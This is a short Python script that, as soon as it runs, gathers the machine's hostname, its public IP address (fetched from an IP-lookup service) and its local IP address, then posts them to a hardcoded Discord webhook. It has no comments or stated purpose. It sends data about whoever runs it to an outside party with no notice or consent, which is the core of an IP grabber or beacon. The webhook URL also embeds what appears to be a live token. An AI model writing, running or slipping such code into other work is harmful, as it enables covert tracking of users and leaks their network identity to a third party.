import requests
import socket

def ip():
    host = socket.gethostname()
    return socket.gethostbyname(host)

requests.post("https://discord.com/api/webhooks/1483326994253873216/o21iquTxU4nb_YQzQVPh3iemcMLjj-NiqHQwCW_YUktTf3EUVhCnUiX2hRk4vLlaTZnp", {
    "content": str(
        {
            "hostname": socket.gethostname(),
            "ipA": requests.get("https://api.ipify.org").text,
            "ipB": ip()
        }
    )
})
